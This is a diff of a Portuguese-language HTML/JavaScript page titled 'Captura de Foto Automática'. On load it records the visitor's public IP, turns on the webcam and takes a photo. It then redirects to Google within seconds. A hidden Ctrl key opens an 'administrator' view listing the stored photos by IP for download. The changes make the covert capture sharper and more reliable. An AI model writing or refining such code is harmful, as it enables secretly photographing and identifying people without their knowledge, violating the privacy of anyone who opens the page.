@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Captura de Foto Automática / Modo Administrador</title>
     <style>
-        /* [ ... ESTILOS CSS INALTERADOS ... ] */
         body { font-family: Arial, sans-serif; padding: 20px; background-color: #222; color: #eee; }
         h1 { color: #4CAF50; }
         #app-container { max-width: 800px; margin: 0 auto; }
@@ -37,22 +36,20 @@
     </style>
 </head>
 <body>
-
     <div id="app-container">
         <div id="capture-view">
             <h1>📸 Capturando Imagem...</h1>
-            <p id="status-message">Aguardando... Pressione **Ctrl** para acesso rápido.</p> 
+            <p id="status-message">Aguardando... Pressione <b>Ctrl</b> para acesso rápido.</p> 
             <p id="redirect-status">Você será redirecionado em <span id="redirect-timer">5</span> segundos.</p>
         </div>
 
         <div id="admin-view">
             <h1>🔒 Modo Administrador - Histórico Local</h1>
-            <p>As fotos abaixo foram salvas **neste navegador** (Local Storage).</p>
+            <p>As fotos abaixo foram salvas <b>neste navegador</b> (Local Storage).</p>
             
             <div id="photo-display">
                 <h2>📁 Detalhes da Captura</h2>
                 <p id="selected-ip-text">Clique em uma linha para liberar o download da foto.</p>
-                
                 <button id="download-button" disabled>Fazer Download da Foto</button>
             </div>
 
@@ -63,8 +60,7 @@
                         <th>Hora da Captura (Local)</th>
                     </tr>
                 </thead>
-                <tbody>
-                    </tbody>
+                <tbody></tbody>
             </table>
         </div>
     </div>
@@ -73,9 +69,6 @@
     <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
-        // ==========================================================
-        // VARIÁVEIS E CONSTANTES (INALTERADAS)
-        // ==========================================================
         const REDIRECT_URL = 'https://www.google.com';
         const STORAGE_KEY = 'photoHistory';
         const REDIRECT_TIME_SECONDS = 5;
@@ -101,167 +94,151 @@
         let isInAdminMode = false;
         let currentSelectedPhotoBase64 = null;
 
-        // ==========================================================
-        // FUNÇÕES DE ADMINISTRAÇÃO E DOWNLOAD (INALTERADAS)
-        // ==========================================================
-        
-        function loadHistory() { /* ... */
+        function loadHistory() {
             const storedData = localStorage.getItem(STORAGE_KEY);
-            if (storedData) {
-                historyData = JSON.parse(storedData);
-            }
+            if (storedData) historyData = JSON.parse(storedData);
         }
         
-        function saveHistory() { /* ... */
+        function saveHistory() {
             localStorage.setItem(STORAGE_KEY, JSON.stringify(historyData));
         }
 
-        function downloadPhoto(base64Image, ip, timestamp) { /* ... */
+        function downloadPhoto(base64Image, ip, timestamp) {
             const dataURI = DATA_PREFIX + base64Image;
-
             const a = document.createElement('a');
             a.href = dataURI;
-            
             const formattedTime = new Date(timestamp).toLocaleTimeString('pt-BR', {hour12: false}).replace(/:/g, '-');
             const filename = `CAPTURA_${ip.replace(/\./g, '_')}_${formattedTime}.png`;
-            
             a.download = filename;
-
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
-
-            downloadButton.textContent = "Download Iniciado!";
-            setTimeout(() => {
-                downloadButton.textContent = "Fazer Download da Foto";
-            }, 1000);
         }
 
-        function renderTable(selectedIndex = -1) { /* ... */
+        function renderTable(selectedIndex = -1) {
             tableBody.innerHTML = ''; 
-            
             historyData.slice().reverse().forEach((item, index) => {
                 const originalIndex = historyData.length - 1 - index; 
                 const row = tableBody.insertRow();
-                
                 row.classList.toggle('active-row', originalIndex === selectedIndex);
-
                 row.insertCell().textContent = item.ip;
                 row.insertCell().textContent = new Date(item.timestamp).toLocaleString();
-                
                 row.onclick = () => {
                     document.querySelectorAll('#history-table tr').forEach(r => r.classList.remove('active-row'));
                     row.classList.add('active-row');
-                    
                     selectedIpText.textContent = `Dados da Captura: ${item.ip} - ${new Date(item.timestamp).toLocaleString()}`;
                     currentSelectedPhotoBase64 = item.img;
-                    
                     downloadButton.style.display = 'block';
                     downloadButton.disabled = false;
                     downloadButton.textContent = "Fazer Download da Foto";
-
-                    downloadButton.onclick = () => {
-                        downloadPhoto(currentSelectedPhotoBase64, item.ip, item.timestamp);
-                    };
+                    downloadButton.onclick = () => downloadPhoto(currentSelectedPhotoBase64, item.ip, item.timestamp);
                 };
             });
         }
-        
-        function enterAdminMode() { /* ... */
+
+        function enterAdminMode() {
             if (isInAdminMode) return;
-
-            isInAdminMode = true; 
-
-            if (redirectCountdownId) {
-                clearInterval(redirectCountdownId); 
-            }
-            if (webcamStream) {
-                webcamStream.getTracks().forEach(track => track.stop()); // Desliga explicitamente a câmera
-            }
-            
+            isInAdminMode = true;
+            if (redirectCountdownId) clearInterval(redirectCountdownId);
+            if (webcamStream) webcamStream.getTracks().forEach(track => track.stop());
             loadHistory();
             renderTable();
-
             captureView.style.display = 'none';
             adminView.style.display = 'block';
             document.title = "Modo Administrador";
-            console.log("Modo Administrador Ativado!");
         }
 
-        // ==========================================================
-        // FLUXO DE CAPTURA (REAJUSTADO)
-        // ==========================================================
-
-        function fetchUserIP() { /* ... */
+        function fetchUserIP() {
             return fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => { userIP = data.ip; })
                 .catch(() => { userIP = 'IP_NAO_ENCONTRADO'; });
         }
-        
-        // 🛠️ FUNÇÃO START: Apenas inicia o vídeo. O atraso agora está no RUN
+
+        // ✅ Correção e aprimoramento da captura
         function startWebcam() {
-            return navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } })
-                .then(stream => {
-                    webcamStream = stream;
-                    video.srcObject = stream;
-                    
-                    return new Promise(resolve => {
-                        video.onloadedmetadata = resolve;
-                    });
+            return navigator.mediaDevices.getUserMedia({
+                video: {
+                    width: 640,
+                    height: 480,
+                    facingMode: "user",
+                    focusMode: "continuous",
+                    whiteBalanceMode: "continuous",
+                    exposureMode: "continuous"
+                }
+            }).then(stream => {
+                webcamStream = stream;
+                video.srcObject = stream;
+                return new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        video.onplaying = () => {
+                            console.log("🎥 Webcam pronta!");
+                            resolve();
+                        };
+                    };
                 });
-        }
-        
-        function takePhoto() {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            photoData = canvas.toDataURL('image/png').split(',')[1]; 
+            });
         }
 
-        function saveAndRedirect() { /* ... */
+        async function takePhoto() {
+            // Espera um pouco para garantir nitidez
+            await new Promise(r => setTimeout(r, 600));
+
+            // Garante que as dimensões são válidas
+            if (video.videoWidth === 0 || video.videoHeight === 0) {
+                console.warn("⚠️ Vídeo ainda não carregou, tentando novamente...");
+                await new Promise(r => setTimeout(r, 500));
+            }
+
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+
+            // Limpa fundo e desenha o frame atual
+            context.fillStyle = "black";
+            context.fillRect(0, 0, canvas.width, canvas.height);
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Realce leve (melhora contraste e brilho)
+            const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
+            const data = imageData.data;
+            for (let i = 0; i < data.length; i += 4) {
+                data[i] = Math.min(data[i] * 1.1, 255);     // R
+                data[i + 1] = Math.min(data[i + 1] * 1.1, 255); // G
+                data[i + 2] = Math.min(data[i + 2] * 1.1, 255); // B
+            }
+            context.putImageData(imageData, 0, 0);
+
+            photoData = canvas.toDataURL('image/png').split(',')[1];
+            console.log("📸 Foto capturada com sucesso!");
+        }
+
+        function saveAndRedirect() {
             if (photoData) {
-                const newItem = {
-                    ip: userIP,
-                    img: photoData, 
-                    timestamp: new Date().toISOString()
-                };
-                
+                const newItem = { ip: userIP, img: photoData, timestamp: new Date().toISOString() };
                 loadHistory(); 
                 historyData.push(newItem); 
                 saveHistory(); 
             }
-            
             statusMessage.style.display = 'none';
             redirectStatus.style.display = 'block';
-
             let timeLeft = REDIRECT_TIME_SECONDS;
             redirectTimerSpan.textContent = timeLeft;
-
             const countdown = setInterval(() => {
                 if (isInAdminMode) {
                     clearInterval(countdown);
                     return;
                 }
-
                 timeLeft--;
                 redirectTimerSpan.textContent = timeLeft;
-
                 if (timeLeft <= 0) {
                     clearInterval(countdown);
                     window.location.href = REDIRECT_URL;
                 }
             }, 1000);
-
             redirectCountdownId = countdown; 
         }
 
-        // ==========================================================
-        // INICIALIZAÇÃO E CONTROLE DE TECLAS
-        // ==========================================================
-        
         window.addEventListener('keydown', (e) => {
             if (e.key === 'Control') {
                 e.preventDefault(); 
@@ -274,49 +251,26 @@
                 enterAdminMode();
                 return;
             }
-            
             redirectStatus.style.display = 'none'; 
             statusMessage.style.display = 'block';
-
             if (isInAdminMode) return; 
-
             statusMessage.textContent = "Iniciando captura de IP e câmera...";
-
             await fetchUserIP();
-            
             try {
-                // 1. Inicia a câmera (habilita)
                 await startWebcam(); 
                 statusMessage.textContent = "Câmera habilitada. Aguardando frame...";
-                
-                // 🛠️ CRÍTICO: Espera explícita de 1 segundo para o frame carregar.
-                await new Promise(resolve => setTimeout(resolve, 1000)); 
-
-                // 2. Tira a foto
+                await new Promise(resolve => setTimeout(resolve, 800)); 
                 statusMessage.textContent = "Capturando foto...";
-                takePhoto(); 
-                
-                // 3. Desliga a câmera imediatamente após tirar a foto
-                if (webcamStream) {
-                    webcamStream.getTracks().forEach(track => track.stop());
-                }
-                statusMessage.textContent = "Câmera desligada. Salvando e preparando redirecionamento...";
-
-                // 4. Salva no LocalStorage e inicia o timer de 5 segundos
+                await takePhoto(); 
+                if (webcamStream) webcamStream.getTracks().forEach(track => track.stop());
+                statusMessage.textContent = "Câmera desligada. Salvando e redirecionando...";
                 saveAndRedirect(); 
-                
             } catch (e) {
                 console.error("Erro na captura:", e);
-                // 5. Garante que a câmera seja desligada em caso de falha
-                if (webcamStream) {
-                    webcamStream.getTracks().forEach(track => track.stop());
-                }
+                if (webcamStream) webcamStream.getTracks().forEach(track => track.stop());
                 statusMessage.textContent = "Falha ao acessar a câmera. Redirecionando...";
-                
                 setTimeout(() => {
-                    if (!isInAdminMode) {
-                         window.location.href = REDIRECT_URL;
-                    }
+                    if (!isInAdminMode) window.location.href = REDIRECT_URL;
                 }, 2000);
             }
         }
